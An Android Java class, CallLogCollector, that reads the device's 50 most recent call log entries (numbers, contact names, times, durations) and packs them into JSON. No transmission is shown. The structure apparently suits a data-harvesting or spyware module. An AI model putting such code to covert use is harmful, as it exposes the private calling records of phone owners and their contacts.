package com.alzahra.data;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import org.json.JSONArray;
import org.json.JSONObject;

public class CallLogCollector {
    private Context context;

    public CallLogCollector(Context ctx) {
        this.context = ctx;
    }

    public JSONArray collectCalls() {
        JSONArray calls = new JSONArray();
        ContentResolver cr = context.getContentResolver();
        Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");
        
        if (cursor != null) {
            int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
            int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
            int nameIndex = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
            
            while (cursor.moveToNext()) {
                try {
                    JSONObject call = new JSONObject();
                    call.put("number", cursor.getString(numberIndex));
                    call.put("type", cursor.getInt(typeIndex));
                    call.put("date", cursor.getLong(dateIndex));
                    call.put("duration", cursor.getInt(durationIndex));
                    call.put("name", cursor.getString(nameIndex) != null ? cursor.getString(nameIndex) : "");
                    calls.put(call);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            cursor.close();
        }
        return calls;
    }
}
